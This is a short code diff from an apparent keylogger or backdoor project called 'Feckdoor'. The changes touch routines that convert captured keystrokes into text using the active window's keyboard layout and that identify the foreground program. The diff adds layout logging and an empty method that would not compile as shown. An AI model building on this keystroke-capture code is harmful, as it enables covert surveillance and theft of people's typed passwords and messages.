@@ -1,5 +1,6 @@
 ﻿using Serilog;
 using System.Diagnostics;
+using System.Runtime.InteropServices;
 using System.Text;
 
 namespace Feckdoor.InputLog
@@ -75,7 +76,9 @@ namespace Feckdoor.InputLog
 					return ""; // Keyboard state unavailable
 
 				var sb = new StringBuilder(256);
-				int bufferLen = User32.ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 256, Convert.ToUInt32(altDown), User32.GetKeyboardLayout(User32.GetWindowThreadProcessId(User32.GetForegroundWindow(), out uint processId)));
+				IntPtr layout = User32.GetKeyboardLayout(User32.GetWindowThreadProcessId(User32.GetForegroundWindow(), out uint _));
+				Log.Information("Current layout: {layout}", (layout.ToInt32() & 0xFFFF0000) >> 16);
+				int bufferLen = User32.ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 256, Convert.ToUInt32(altDown), layout);
 				if (bufferLen != 0)
 				{
 					if (bufferLen < 0)
@@ -100,6 +103,7 @@ namespace Feckdoor.InputLog
 				IntPtr hwnd = User32.GetForegroundWindow();
 
 				// Acquire foreground window thread id bu window id
+				
 				User32.GetWindowThreadProcessId(hwnd, out uint pid);
 
 				// Acquire foreground process id by thread id
@@ -112,6 +116,11 @@ namespace Feckdoor.InputLog
 				Log.Warning(e, "Exception during getting active window info.");
 				return new ActiveWindowInfo { Name = Config.TheConfig.InputLog.FallbackWindowName, Executable = Config.TheConfig.InputLog.FallbackWindowExecutableName };
 			}
+		}
+
+		private string GetCurrentIMEString()
+		{
+		
 		}
 
 		protected virtual void Dispose(bool disposing)
